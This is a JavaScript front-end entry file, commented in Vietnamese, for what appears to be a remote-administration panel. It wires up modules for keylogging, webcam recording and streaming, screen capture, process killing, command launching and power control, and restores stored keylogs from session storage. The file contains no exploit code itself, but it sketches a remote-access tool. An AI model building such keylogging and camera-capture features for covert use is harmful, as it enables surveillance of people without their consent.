// app.js (File Main)
// Nhiem vu: Import tat ca cac module, gan vao 'window'
// va khoi tao ung dung.

import { store } from "./modules/store.js";
import { api } from "./modules/api.js";
import {
  logActionUI,
  toggleActionLog,
  showTab,
  filterTable,
} from "./modules/ui.js";
import {
  loadApps,
  closeWin,
  startCmd,
  addRecent,
  renderRecents,
} from "./modules/tab-apps.js";
import { loadProcs, kill } from "./modules/tab-procs.js";
import {
  updateScreen,
  toggleAutoShot,
  loadGallery,
  clearGallery,
  toggleScreenStream,
} from "./modules/tab-screen.js";
import {
  loadDevices,
  recordVideo,
  loadVidGallery,
  clearVideos,
  toggleCamStream,
} from "./modules/tab-cam.js";
import { toggleKeylog, clearLogs } from "./modules/tab-keylog.js";
import { sendPower } from "./modules/tab-sys.js";

// --- GAN HAM VAO WINDOW DE HTML GOI DUOC ---
// Gan object 'window' de cac ham onclick="..." trong HTML co the truy cap
window.logActionUI = logActionUI;
window.toggleActionLog = toggleActionLog;
window.showTab = showTab;
window.filterTable = filterTable;
window.loadApps = loadApps;
window.closeWin = closeWin;
window.startCmd = startCmd;
window.renderRecents = renderRecents;
window.loadProcs = loadProcs;
window.kill = kill;
window.updateScreen = updateScreen;
window.toggleAutoShot = toggleAutoShot;
window.loadGallery = loadGallery;
window.clearGallery = clearGallery;
window.toggleScreenStream = toggleScreenStream;
window.loadDevices = loadDevices;
window.recordVideo = recordVideo;
window.loadVidGallery = loadVidGallery;
window.clearVideos = clearVideos;
window.toggleCamStream = toggleCamStream;
window.toggleKeylog = toggleKeylog;
window.clearLogs = clearLogs;
window.sendPower = sendPower;

// --- KHOI TAO INDEXEDDB ---
// Mo CSDL cua trinh duyệt de luu tru lau dai
const DB_REQ = indexedDB.open("RemoteDB_V2", 2);

// Ham nay chi chay khi nang cap version (hoac tao moi)
DB_REQ.onupgradeneeded = (e) => {
  let db = e.target.result;
  // Tao cac "bang" (object store) de luu anh va video
  if (!db.objectStoreNames.contains("images"))
    db.createObjectStore("images", { keyPath: "id", autoIncrement: true });
  if (!db.objectStoreNames.contains("videos"))
    db.createObjectStore("videos", { keyPath: "id", autoIncrement: true });
};

// Ham nay chay khi mo CSDL thanh cong
DB_REQ.onsuccess = (e) => {
  // LUU Y: Chung ta luu doi tuong 'db' vao 'store' de cac module khac co a.
  store.db = e.target.result;

  // Tai lai thu vien anh/video da luu
  loadGallery();
  loadVidGallery();
};

// --- KHOI CHAY UNG DUNG ---

// Phuc hoi log tu sessionStorage (neu co)
const logArea = document.getElementById("logArea");
if (logArea) {
  logArea.value = sessionStorage.getItem("keylogs") || "";
}

// Hien thi tab dau tien (Apps)
showTab("apps");
